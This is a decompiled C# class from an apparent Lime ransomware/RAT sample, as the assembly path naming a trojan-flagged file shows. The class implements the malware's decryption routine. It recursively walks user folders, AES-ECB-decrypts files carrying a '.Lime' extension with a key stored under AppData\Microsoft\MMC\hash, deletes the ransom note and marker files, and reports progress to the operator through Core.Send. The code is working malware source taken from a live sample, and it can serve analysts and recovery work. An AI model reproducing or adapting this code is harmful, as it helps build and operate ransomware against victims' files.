// Decompiled with JetBrains decompiler
// Type: RwareDE
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class RwareDE
{
  public object Decrypt_File()
  {
    this.Launch_decrypt();
    object obj;
    return obj;
  }

  private object Launch_decrypt()
  {
    Core.Send("MSG" + Core.Y + "Ransomware: It might take some time, Please Wait..");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\");
    Core.Send("MSG" + Core.Y + "Ransomware: %50 left...");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\");
    Core.Send("MSG" + Core.Y + "Ransomware: %80 left...");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\");
    string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    try
    {
      File.Delete(folderPath1 + "\\Microsoft\\MMC\\hash");
      File.Delete(folderPath2 + "\\Ransomware.txt");
      File.Delete(Path.GetTempPath() + "done.LE");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Core.Send("MSG" + Core.Y + "Ransomware: All files have been decrypted");
    return (object) true;
  }

  private object Work_File(string MyPath, bool delete = false)
  {
    string key = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\MMC\\hash");
    try
    {
      int num1 = checked (MyProject.Computer.FileSystem.GetFiles(MyPath).Count - 1);
      int index1 = 0;
      while (index1 <= num1)
      {
        if (MyProject.Computer.FileSystem.GetFiles(MyPath)[index1].IndexOf(".Lime") > -1)
        {
          if (!delete)
            this.DeCrypt((object) MyProject.Computer.FileSystem.GetFiles(MyPath)[index1], (object) key);
          MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.GetFiles(MyPath)[index1] + ".Lime");
        }
        checked { ++index1; }
      }
      int num2 = checked (MyProject.Computer.FileSystem.GetDirectories(MyPath).Count - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        this.Work_File(MyProject.Computer.FileSystem.GetDirectories(MyPath)[index2]);
        checked { ++index2; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    string[] strArray;
    return (object) strArray;
  }

  public object DeCrypt(object file, object key)
  {
    byte[] input = File.ReadAllBytes(Conversions.ToString(file));
    try
    {
      File.WriteAllBytes(Conversions.ToString(NewLateBinding.LateGet(file, (Type) null, "replace", new object[2]
      {
        (object) ".Lime",
        (object) ""
      }, (string[]) null, (Type[]) null, (bool[]) null)), this.AES_Decrypt(input, Conversions.ToString(key)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return (object) true;
  }

  public byte[] AES_Decrypt(byte[] input, string pass)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    byte[] numArray;
    try
    {
      byte[] destinationArray = new byte[32];
      byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
      Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
      Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
      rijndaelManaged.Key = destinationArray;
      rijndaelManaged.Mode = CipherMode.ECB;
      ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
      byte[] inputBuffer = input;
      numArray = decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return numArray;
  }
}
